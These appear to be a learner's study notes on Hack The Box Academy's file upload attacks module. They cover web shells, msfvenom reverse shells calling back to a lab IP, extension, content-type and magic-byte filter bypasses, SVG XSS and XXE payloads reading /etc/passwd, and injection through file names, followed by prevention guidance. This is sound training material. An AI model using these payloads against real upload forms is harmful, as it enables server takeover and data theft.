# File Upload Attacks

**Platform:** Hack The Box Academy  
**Module:** File Upload Attacks  
**Sections:** 11  
**Difficulty:** Medium  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Identifying the Web Framework](#identifying-the-web-framework)
3. [Absent Validation — Arbitrary File Upload](#absent-validation--arbitrary-file-upload)
4. [Web Shells and Reverse Shells](#web-shells-and-reverse-shells)
5. [Client-Side Validation Bypass](#client-side-validation-bypass)
   - [Back-End Request Modification via Burp](#back-end-request-modification-via-burp)
   - [Disabling Front-End Validation via DevTools](#disabling-front-end-validation-via-devtools)
6. [Blacklist Filter Bypass](#blacklist-filter-bypass)
   - [Fuzzing Non-Blacklisted Extensions](#fuzzing-non-blacklisted-extensions)
7. [Whitelist Filter Bypass](#whitelist-filter-bypass)
   - [Double Extension Attack](#double-extension-attack)
   - [Reverse Double Extension Attack](#reverse-double-extension-attack)
   - [Character Injection](#character-injection)
8. [Type Filters Bypass](#type-filters-bypass)
   - [Content-Type Header Bypass](#content-type-header-bypass)
   - [MIME-Type Bypass via Magic Bytes](#mime-type-bypass-via-magic-bytes)
9. [Limited File Upload Attacks](#limited-file-upload-attacks)
   - [XSS via File Uploads](#xss-via-file-uploads)
   - [XXE via SVG Uploads](#xxe-via-svg-uploads)
   - [DoS via File Uploads](#dos-via-file-uploads)
10. [Other Upload Attacks](#other-upload-attacks)
    - [Injections in File Names](#injections-in-file-names)
    - [Upload Directory Disclosure](#upload-directory-disclosure)
    - [Windows-Specific Attacks](#windows-specific-attacks)
11. [Preventing File Upload Vulnerabilities](#preventing-file-upload-vulnerabilities)
    - [Extension Validation](#extension-validation)
    - [Content Validation](#content-validation)
    - [Upload Disclosure Prevention](#upload-disclosure-prevention)
    - [Further Security Hardening](#further-security-hardening)
12. [External Resources](#external-resources)
13. [Key Tools Reference](#key-tools-reference)
14. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

File upload functionality is one of the most powerful and commonly exploited attack surfaces in web applications. When user-supplied files are accepted without proper validation, an attacker can upload malicious scripts — transforming the upload feature into a direct path to Remote Code Execution (RCE), full server compromise, and lateral movement into internal networks.

File upload vulnerabilities are consistently ranked among the **Top 10 Web Security Risks** by OWASP and frequently appear in CVE reports rated **High or Critical**. The severity stems from a single critical chain: upload a PHP/ASP web shell → visit its URL → execute arbitrary OS commands as the web server user.

### Attack Surface Matrix

| Validation Level | Attack | Impact |
|-----------------|--------|--------|
| No validation at all | Direct web shell upload | RCE as `www-data` |
| Client-side only | Burp modification or DevTools bypass | RCE |
| Blacklist (extension) | Non-blacklisted extension (`.phtml`, `.phar`) | RCE |
| Whitelist (extension) | Double extension, reverse double extension, character injection | RCE |
| Content-Type header | Change `Content-Type` to `image/*` | RCE |
| MIME-Type (magic bytes) | Prepend GIF magic bytes (`GIF8`) to PHP payload | RCE |
| Limited uploads only | XSS via HTML/SVG/metadata, XXE via SVG, DoS via ZIP bomb | XSS / XXE / DoS |

### Common Root Causes

- No file type validation on the back-end
- Validation only on the front-end (JavaScript) — trivially bypassed
- Incomplete blacklists that miss alternative PHP extensions
- Regex errors in whitelists (missing `$` anchor — checks for contains, not ends with)
- Content-Type header checked instead of actual file content (MIME type)
- Outdated libraries with known upload-related CVEs (ffmpeg XXE, ImageMagick exploits)
- Upload directory exposed and directly web-accessible

---

## Identifying the Web Framework

Before uploading any payload, identify the back-end language — a PHP web shell will not execute on an ASP.NET server and vice versa.

### Method 1 — URL Extension

```
http://94.237.54.116:3277/index.php   → PHP
http://94.237.54.116:3277/index.asp   → Classic ASP
http://94.237.54.116:3277/index.aspx  → ASP.NET
http://94.237.54.116:3277/index.jsp   → Java JSP
```

If the page loads normally, that extension is running on the server.

### Method 2 — Wappalyzer Browser Extension

Install Wappalyzer in Firefox or Chrome. Click the icon on any page to instantly see:
- Back-end language and version (PHP 7.4, Node.js, etc.)
- Web server (Apache, Nginx, IIS)
- Operating system (Ubuntu, Windows Server)
- JavaScript frameworks and CDNs

### Method 3 — Burp/ZAP Response Headers

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

The `X-Powered-By` header directly reveals the back-end language. `Server` reveals the web server software.

### Method 4 — Ffuf Extension Fuzzing

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://94.237.54.116:3277/indexFUZZ

php                    [Status: 200, Size: 1234]
```

---

## Absent Validation — Arbitrary File Upload

The simplest case — no validation whatsoever. Any file type can be uploaded directly.

### Identifying No Validation

Indicators:
- File selector dialog shows "All Files" with no type restriction
- No error message when selecting a `.php` or `.exe` file
- Any filename is reflected in the upload success message

**Confirm with a PHP hello world test:**

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php echo "Hello HTB";?>' > test.php
```

Upload `test.php`. If the server returns the page at `/uploads/test.php` and displays `Hello HTB` — PHP execution is confirmed and the server is fully vulnerable.

---

## Web Shells and Reverse Shells

### Web Shell — PHP (One-Liner)

```php
<?php system($_REQUEST['cmd']); ?>
```

Upload as `shell.php`. Execute commands via URL:

```
http://94.237.54.116:3277/uploads/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Tip:** Use browser source view (`CTRL+U`) instead of normal page view — raw command output renders correctly without HTML entity encoding distorting the output.

### Web Shell — ASP.NET

```asp
<% eval request('cmd') %>
```

### Web Shell — JSP

```jsp
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

### phpbash — Interactive Web Shell

[phpbash](https://github.com/Arrexel/phpbash) provides a terminal-like semi-interactive experience in the browser. Upload `phpbash.php` and visit the link — no `?cmd=` parameter needed.

### Reverse Shell — PHP (pentestmonkey)

```php
// Modify lines 49-50 in the pentestmonkey shell:
$ip = '10.10.16.36';    // Attack host IP
$port = 9001;            // Netcat listener port
```

```bash
# Start listener
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9001

# Upload reverse.php → visit its URL → connection received
listening on [any] 9001 ...
connect to [10.10.16.36] from (UNKNOWN) [94.237.54.116] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell — msfvenom Generated

```bash
# PHP reverse shell
Hackerpatel007_1@htb[/htb]$ msfvenom -p php/reverse_php LHOST=10.10.16.36 LPORT=9001 -f raw > reverse.php

# ASP reverse shell
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=9001 -f asp > reverse.asp

# WAR (Java) reverse shell
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.36 LPORT=9001 -f war > reverse.war
```

> **Reverse shell vs web shell:** Reverse shells are always preferred — they provide interactive access, TTY upgrades, and are harder to detect in web logs. Web shells are the fallback when outbound connections from the target are blocked by firewall rules.

---

## Client-Side Validation Bypass

Client-side validation — JavaScript running in the browser — is entirely under the attacker's control. It can be bypassed in two ways without ever touching the server.

### Back-End Request Modification via Burp

**How it works:** Upload a valid image first, intercept the request in Burp, replace the filename and content with the PHP web shell, forward.

**Step 1 — Intercept the legitimate image upload:**

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="HTB.png"
Content-Type: image/png

[PNG binary content]
------WebKitFormBoundary--
```

**Step 2 — Modify filename and content:**

```http
------WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundary--
```

Forward the modified request → `File successfully uploaded`. Visit `/profile_images/shell.php?cmd=id` → RCE confirmed.

---

### Disabling Front-End Validation via DevTools

**Step 1 — Open Page Inspector (`CTRL+SHIFT+C`) and click the upload input:**

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

**Step 2 — Inspect the `checkFile` function in Console (`CTRL+SHIFT+K`):**

```javascript
function checkFile(File) {
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    }
}
```

**Step 3 — Delete the `onchange="checkFile(this)"` attribute directly in the Inspector:**

The upload button is now enabled for any file type. Upload `shell.php` normally — no Burp interception needed.

> **Note:** DevTools modifications are temporary — a page refresh resets them. This is sufficient since we only need to submit the upload once.

---

## Blacklist Filter Bypass

Blacklist validation rejects files with explicitly listed extensions. The weakness: any extension not on the blacklist is permitted — and PHP can execute through dozens of alternative extensions.

### How Blacklist Validation Works

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

This blacklist blocks `php`, `php7`, and `phps` — but dozens of other PHP-executable extensions are missing.

### Fuzzing Non-Blacklisted Extensions

**Step 1 — Download the PHP extensions wordlist:**

```bash
Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.txt
```

**Step 2 — Send the upload request to Burp Intruder. Set the extension as the fuzz position:**

```
filename="HTB§.php§"
```

**Step 3 — Load the PHP extensions wordlist in Payloads → uncheck URL-encode.**

**Step 4 — Start attack → sort by Length → extensions returning different Content-Length than the error response are allowed.**

### Non-Blacklisted PHP Extensions

These extensions execute PHP code on most Apache/PHP configurations:

| Extension | Notes |
|-----------|-------|
| `.phtml` | PHP HTML — widely supported |
| `.phar` | PHP Archive — executable |
| `.php5` | PHP 5 files — often overlooked |
| `.php4` | PHP 4 legacy — sometimes allowed |
| `.phps` | PHP source — may execute |
| `.pht` | Short PHP tag variant |
| `.shtml` | Server-side includes — Apache |

**Upload with allowed extension:**

```http
POST /upload.php
filename="shell.phtml"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
```

Visit `/profile_images/shell.phtml?cmd=id` → RCE confirmed.

> **Case sensitivity tip:** On Windows servers, comparisons are case-insensitive at the OS level but the PHP blacklist check may be case-sensitive. Try `shell.PHP`, `shell.PhP`, `shell.pHp` to bypass case-sensitive string comparisons.

---

## Whitelist Filter Bypass

Whitelist validation only allows listed extensions. It is generally more secure than blacklisting — but is still exploitable through regex weaknesses, server misconfigurations, and special character injection.

### How Whitelist Validation Works

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// FLAWED — checks if extension exists anywhere in filename (no $ anchor)
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

The regex lacks a `$` end anchor — it checks whether the filename **contains** the extension, not whether it **ends** with it.

---

### Double Extension Attack

**Exploit the missing `$` anchor:** Add the allowed extension to the filename, then append `.php`:

```
shell.jpg.php
```

The regex matches `.jpg` anywhere in the filename — passes validation. The server executes `.php` as the final extension.

```http
POST /upload.php
filename="shell.jpg.php"

<?php system($_REQUEST['cmd']); ?>
```

Visit `/profile_images/shell.jpg.php?cmd=id` → RCE confirmed.

---

### Reverse Double Extension Attack

When a strict whitelist regex uses `$` and only accepts the final extension, the attack vector shifts to web server misconfiguration.

**Vulnerable Apache PHP configuration (`/etc/apache2/mods-enabled/php7.4.conf`):**

```xml
<!-- MISSING $ anchor — executes PHP if .php appears ANYWHERE in filename -->
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Attack:** Upload a file that ends with a whitelisted extension but contains `.php` earlier:

```
shell.php.jpg
```

- Whitelist check: filename ends with `.jpg` → ✅ Passes
- Apache FilesMatch: filename contains `.php` → executes as PHP

```http
POST /upload.php
filename="shell.php.jpg"

<?php system($_REQUEST['cmd']); ?>
```

Visit `/profile_images/shell.php.jpg?cmd=id` → RCE confirmed.

---

### Character Injection

Certain special characters can cause the web server to misinterpret the filename and truncate or alter the perceived extension:

| Character | Effect | Example |
|-----------|--------|--------|
| `%00` | Null byte — truncates filename at this point (PHP < 5.x) | `shell.php%00.jpg` → stored as `shell.php` |
| `%20` | URL-encoded space — may confuse extension parsing | `shell.php%20.jpg` |
| `/` | Path separator — may cause directory traversal | `shell.php/.jpg` |
| `.\` | Windows path separator | `shell.php.\.jpg` |
| `:` | Windows ADS — write as alternate data stream | `shell.aspx:.jpg` → writes `shell.aspx` |
| `%0a` | Newline — may break string comparison | `shell.php%0a.jpg` |

**Generate a full character injection wordlist:**

```bash
Hackerpatel007_1@htb[/htb]$ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

Hackerpatel007_1@htb[/htb]$ wc -l wordlist.txt
72
```

Fuzz with Burp Intruder using this wordlist — any hit with a different response length may indicate a bypassed filter.

---

## Type Filters Bypass

Extension-based filters are not the only defence. Modern applications may also validate the **Content-Type header** or the **file's actual MIME type** (magic bytes). Both can be bypassed.

### Content-Type Header Bypass

The `Content-Type` header is set by the browser — it is completely client-controlled and trivially modified in Burp.

**Vulnerable PHP code:**

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Attack:** Keep the filename as `shell.php`, change the `Content-Type` header:

```http
POST /upload.php
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpg

<?php system($_REQUEST['cmd']); ?>
```

The `Content-Type: image/jpg` bypasses the check. The file is stored and executed as PHP.

> **Note:** A multipart upload request has two `Content-Type` headers — one for the whole request and one for the file part. Always modify the **file part's** Content-Type, not the request-level one.

**Fuzzing allowed Content-Types:**

```bash
Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
Hackerpatel007_1@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt

# Fuzz with Burp Intruder — 45 image types vs 700+ total
```

---

### MIME-Type Bypass via Magic Bytes

MIME-type validation inspects the **first bytes of the file's content** (file signature / magic bytes) — not the extension or the Content-Type header. It is performed server-side via functions like PHP's `mime_content_type()`.

**Vulnerable PHP code:**

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**How magic bytes work:**

```bash
Hackerpatel007_1@htb[/htb]$ echo "this is a text file" > text.jpg
Hackerpatel007_1@htb[/htb]$ file text.jpg
text.jpg: ASCII text

Hackerpatel007_1@htb[/htb]$ echo "GIF8" > text.jpg
Hackerpatel007_1@htb[/htb]$ file text.jpg
text.jpg: GIF image data
```

Adding `GIF8` (the GIF magic byte sequence) to the start of any file causes the OS and web server to detect it as a GIF image — regardless of the actual content or extension.

**Attack — Prepend GIF magic bytes to PHP web shell:**

In Burp Repeater, modify the file content field:

```
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Keep `filename="shell.php"` and set `Content-Type: image/gif`.

```
HTTP/1.1 200 OK
File successfully uploaded.
```

Visit `/profile_images/shell.php?cmd=id`:

```
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> The `GIF8` string appears before the command output — this is expected. The PHP engine encounters the `GIF8` string as plain text output before processing the `<?php ?>` block.

**Common magic byte sequences:**

| Format | Magic Bytes | ASCII |
|--------|------------|-------|
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| JPEG | `FF D8 FF` | Non-printable |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

> **GIF is the easiest to use** because its magic bytes (`GIF8`) are entirely printable ASCII — they can be typed directly into Burp without hex encoding.

---

## Limited File Upload Attacks

Even when arbitrary file uploads are blocked and only specific types like images or documents are allowed, these permitted file types can still be weaponised for XSS, XXE, and DoS.

### XSS via File Uploads

**Method 1 — HTML file upload:**

If HTML files are accepted, upload a page containing JavaScript:

```html
<script>alert(window.origin);</script>
```

Any user visiting the uploaded HTML file URL will execute the JavaScript in their browser.

**Method 2 — EXIF metadata injection:**

If the application displays image metadata, inject XSS into metadata fields:

```bash
Hackerpatel007_1@htb[/htb]$ exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
Hackerpatel007_1@htb[/htb]$ exiftool HTB.jpg | grep Comment

Comment: "><img src=1 onerror=alert(window.origin)>
```

When the web app displays the image metadata, the XSS payload executes.

**Method 3 — SVG XSS:**

SVG is an XML-based image format — it can contain JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Upload as `HTB.svg` — when viewed, the `<script>` block executes in the browser.

---

### XXE via SVG Uploads

SVG files can reference external XML entities — enabling XXE through what appears to be an image upload.

**Read /etc/passwd via SVG XXE:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

When the SVG is displayed by the web application, the XML parser reads `/etc/passwd` and injects its content into the SVG output.

**Read PHP source code via SVG XXE + PHP filter:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

The response contains the base64-encoded content of `index.php`. Decode offline to retrieve the full source code.

```bash
Hackerpatel007_1@htb[/htb]$ echo 'PD9waHAgJGZsYWcgPS...' | base64 -d
```

---

### DoS via File Uploads

**1 — Decompression Bomb (ZIP bomb):**

Upload a `.zip` file containing deeply nested archives that expand to petabytes. If the application auto-extracts ZIP files, it will exhaust disk space or memory.

**2 — Pixel Flood Attack (JPG/PNG):**

Create a small image and manually modify its compression metadata to claim a size of `0xffff x 0xffff` (4 gigapixels). When the server tries to process or display the image, it attempts to allocate ~4GB of memory and crashes.

**3 — Overly large file upload:**

If no file size limit is enforced, upload a massive file to fill the server's storage.

**4 — XXE-based DoS:**

Upload an SVG or XML document with a Billion Laughs attack — an entity that references itself exponentially, consuming all available memory.

**5 — Directory traversal via filename:**

```
../../../etc/passwd
```

If the filename is used in a file operation, traversal characters may cause the server to write to or read from unintended paths.

---

## Other Upload Attacks

### Injections in File Names

The uploaded filename itself can be a payload if the application passes it to OS commands or SQL queries.

**Command injection in filename:**

```
file$(whoami).jpg      ← Bash command substitution
file`whoami`.jpg       ← Backtick command substitution
file.jpg||whoami       ← OR chaining
file.jpg;whoami;       ← Statement termination
```

If the server runs `mv "FILENAME" /tmp/uploads/`, the injected command executes as part of the shell command.

**XSS in filename:**

```html
<script>alert(window.origin);</script>.jpg
```

If the filename is reflected in the page (e.g., "You uploaded: `<script>...`"), XSS fires.

**SQLi in filename:**

```
file';select+sleep(5);--.jpg
```

If the filename is used in an SQL query, this causes a time-based blind injection.

---

### Upload Directory Disclosure

When the upload directory path is unknown, use these methods to discover it:

| Technique | Method |
|-----------|--------|
| **Force errors** | Upload a file with a name that already exists — error may reveal the path |
| **Duplicate requests** | Send two identical upload requests simultaneously — race condition error reveals path |
| **Overly long filename** | Upload a file with 5,000+ character name — buffer overflow error reveals path |
| **LFI/XXE** | Read web application source code to find the `$upload_dir` variable |
| **IDOR** | Reference IDOR techniques to find file paths (see Web Attacks module) |

---

### Windows-Specific Attacks

| Technique | Description |
|-----------|-------------|
| Reserved characters | `|`, `<`, `>`, `*`, `?` in filenames cause file operation errors that reveal paths |
| Reserved device names | `CON`, `COM1`, `LPT1`, `NUL` as filenames cause write errors |
| Windows 8.3 filename | `HAC~1.TXT` refers to `hackthebox.txt` — use to reference or overwrite existing files |
| Alternate Data Streams | `file.aspx:.jpg` writes the file as `file.aspx` (the `:` truncates at the ADS separator) |
| Case insensitivity | `shell.PHP` or `shell.pHp` may bypass case-sensitive blacklist string comparisons |

---

## Preventing File Upload Vulnerabilities

### Extension Validation

Always combine both approaches — whitelist as the primary control, blacklist as a safety net:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// Blacklist — blocks known dangerous extensions
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// Whitelist — only allows explicitly safe extensions (with $ anchor)
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

> **Critical:** The whitelist regex must end with `$` to ensure the check matches only the **final** extension — not just any occurrence of the allowed extension in the filename.

---

### Content Validation

Extension validation alone is insufficient. Always validate both the Content-Type header AND the MIME type, and ensure they match:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// Whitelist extension
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// Validate both Content-Type and MIME type
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

---

### Upload Disclosure Prevention

**Never expose the upload directory directly.** All file access should be routed through a controlled download script:

```php
// download.php — controlled file serving
// Enforce authorization: verify the file belongs to the requesting user
// Use path validation to prevent LFI via the file parameter
// Set security headers:

header('Content-Disposition: attachment; filename="' . $safeFilename . '"');
header('Content-Type: ' . $safeMimeType);
header('X-Content-Type-Options: nosniff');
```

**Additional disclosure mitigations:**
- Randomize stored filenames — store the sanitized original name in the database separately
- Block direct access to the uploads directory (return `403 Forbidden`)
- Store uploaded files on a separate server or container — limits RCE blast radius
- Use PHP's `open_basedir` to prevent web application access outside its directory

---

### Further Security Hardening

**Disable dangerous PHP functions in `php.ini`:**

```ini
disable_functions = exec,shell_exec,system,passthru,popen,proc_open,
                   curl_exec,curl_multi_exec,parse_ini_file,show_source
```

**Application-level security checklist:**

| Control | Implementation |
|---------|---------------|
| File size limit | Reject uploads exceeding a defined maximum size |
| Malware scanning | Scan uploaded files with ClamAV or equivalent before storage |
| Error handling | Never display raw server errors — return generic messages only |
| Library updates | Regularly update XML parsers, image processors (ImageMagick, ffmpeg), and all upload-related libraries |
| WAF | Deploy WAF (ModSecurity, Cloudflare) as a secondary defence layer — not a primary control |
| Content Security Policy | Set `Content-Security-Policy` headers to limit what uploaded content can execute |

---

## External Resources

### Web Shell Collections

| Resource | URL | Description |
|----------|-----|-------------|
| **phpbash** | https://github.com/Arrexel/phpbash | Interactive terminal-style PHP web shell |
| **SecLists Web-Shells** | https://github.com/danielmiessler/SecLists/tree/master/Web-Shells | Web shells for PHP, ASP, ASPX, JSP, CFM, and more |
| **p0wny-shell** | https://github.com/flozz/p0wny-shell | Minimalist single-file PHP web shell with terminal UI |
| **WhiteWinterWolf PHP Shell** | https://github.com/WhiteWinterWolf/wwwolf-php-webshell | Feature-rich PHP web shell |

### Reverse Shell Resources

| Resource | URL | Description |
|----------|-----|-------------|
| **pentestmonkey PHP Reverse Shell** | https://github.com/pentestmonkey/php-reverse-shell | Most reliable PHP reverse shell |
| **Reverse Shell Generator** | https://www.revshells.com | Generate reverse shells for any language/OS online |
| **PayloadsAllTheThings — Reverse Shells** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md | Comprehensive reverse shell cheat sheet |

### Extension and Content-Type Wordlists

| Resource | URL | Description |
|----------|-----|-------------|
| **PayloadsAllTheThings PHP Extensions** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PHP | PHP extension bypass list |
| **PayloadsAllTheThings ASP Extensions** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP | ASP/.NET extension bypass list |
| **SecLists Web Extensions** | https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt | Common web extensions wordlist |
| **SecLists Content-Types** | https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt | All content-type values for fuzzing |

### XXE and SVG Attack References

| Resource | URL | Description |
|----------|-----|-------------|
| **XXEinjector** | https://github.com/enjoiz/XXEinjector | Automated XXE exploitation tool |
| **PayloadsAllTheThings XXE** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection | Comprehensive XXE payload library |
| **OWASP XXE Prevention** | https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html | XXE Prevention Cheat Sheet |

### Vulnerability References

| Resource | URL | Description |
|----------|-----|-------------|
| **OWASP File Upload Cheat Sheet** | https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html | Comprehensive file upload security guide |
| **HackTricks File Upload** | https://book.hacktricks.xyz/pentesting-web/file-upload | File upload attack techniques |
| **ffmpeg XXE CVE** | https://nvd.nist.gov/vuln/detail/CVE-2016-1897 | AVI upload leading to XXE in ffmpeg |
| **ImageMagick exploits** | https://imagetragick.com | ImageMagick arbitrary file read/RCE via image processing |
| **PayloadsAllTheThings Upload** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files | Master upload attack payload collection |

### Framework Detection Tools

| Tool | URL | Description |
|------|-----|-------------|
| **Wappalyzer** | https://www.wappalyzer.com | Browser extension for tech stack fingerprinting |
| **WhatWeb** | https://github.com/urbanadventurer/WhatWeb | CLI web technology fingerprinting tool |
| **BuiltWith** | https://builtwith.com | Online tech stack identifier |

---

## Key Tools Reference

| Command | Purpose |
|---------|--------|
| `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php` | Create minimal PHP web shell |
| `nc -lvnp 9001` | Start reverse shell listener |
| `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > reverse.php` | Generate PHP reverse shell with msfvenom |
| `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > reverse.asp` | Generate ASP reverse shell with msfvenom |
| `file <filename>` | Check a file's MIME type from magic bytes |
| `echo "GIF8" > shell.php` | Add GIF magic bytes to spoof MIME type |
| `exiftool -Comment='<xss_payload>' image.jpg` | Inject XSS into image EXIF metadata |
| `exiftool image.jpg \| grep Comment` | Verify injected EXIF data |
| `ffuf -w web-extensions.txt:FUZZ -u http://94.237.54.116:3277/indexFUZZ` | Fuzz for server-side language via extension |
| `wget https://raw.githubusercontent.com/.../extensions.txt` | Download PHP extension bypass wordlist |
| `for char in '%20' '%0a' '%00' '/' '.' ':'; do ... done` | Generate character injection wordlist |
| `cat web-all-content-types.txt \| grep 'image/' > image-types.txt` | Filter image MIME types for fuzzing |
| `echo '<base64>' \| base64 -d` | Decode base64 content from XXE PHP filter exfiltration |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — file upload vulnerability exploitation |
| T1505 | T1505.003 | Server Software Component: Web Shell — uploading PHP/ASP/JSP web shells via file upload |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — executing OS commands via web shell `?cmd=` |
| T1059 | T1059.007 | Command and Scripting Interpreter: JavaScript — XSS via SVG/HTML/EXIF file upload |
| T1041 | — | Exfiltration Over C2 Channel — reverse shell callback to attacker listener via uploaded script |
| T1083 | — | File and Directory Discovery — reading `/etc/passwd`, web source code via XXE SVG upload |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — reading config files via XXE SVG `php://filter` |
| T1027 | T1027.001 | Obfuscated Files or Information — GIF magic bytes prepended to PHP payload to bypass MIME check |
| T1036 | T1036.008 | Masquerading: Masquerade File Type — double extension (`shell.jpg.php`) and Content-Type spoofing |
| T1499 | T1499.001 | Endpoint Denial of Service: OS Exhaustion Flood — ZIP bomb, pixel flood, oversized file DoS |
| T1071 | T1071.001 | Application Layer Protocol: Web Protocols — all upload attacks delivered over HTTP/HTTPS |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
